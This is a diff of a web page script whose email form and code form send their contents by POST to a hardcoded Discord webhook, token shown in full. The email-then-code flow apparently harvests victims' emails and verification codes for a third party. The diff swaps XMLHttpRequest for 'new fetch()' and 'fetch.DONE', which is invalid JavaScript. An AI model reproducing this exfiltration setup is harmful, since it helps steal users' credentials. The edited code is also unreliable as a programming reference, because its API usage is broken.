@@ -184,11 +184,11 @@
     };
 
     const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0";
-    const xhr = new XMLHttpRequest();
+    const xhr = new fetch();
     xhr.open("POST", webhookUrl, true);
     xhr.setRequestHeader("Content-Type", "application/json");
     xhr.onreadystatechange = function () {
-      if (xhr.readyState === XMLHttpRequest.DONE) {
+      if (xhr.readyState === fetch.DONE) {
         if (xhr.status === 200) {
           document.getElementById("emailForm").style.display = "none";
           document.getElementById("codeFormContainer").style.display = "block";
@@ -223,11 +223,11 @@
 
     // Replace the webhookUrl with the correct URL for the code form webhook
     const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0L";
-    const xhr = new XMLHttpRequest();
+    const xhr = new fetch();
     xhr.open("POST", webhookUrl, true);
     xhr.setRequestHeader("Content-Type", "application/json");
     xhr.onreadystatechange = function () {
-      if (xhr.readyState === XMLHttpRequest.DONE) {
+      if (xhr.readyState === fetch.DONE) {
         if (xhr.status === 200) {
           // Handle successful webhook submission
         } else {
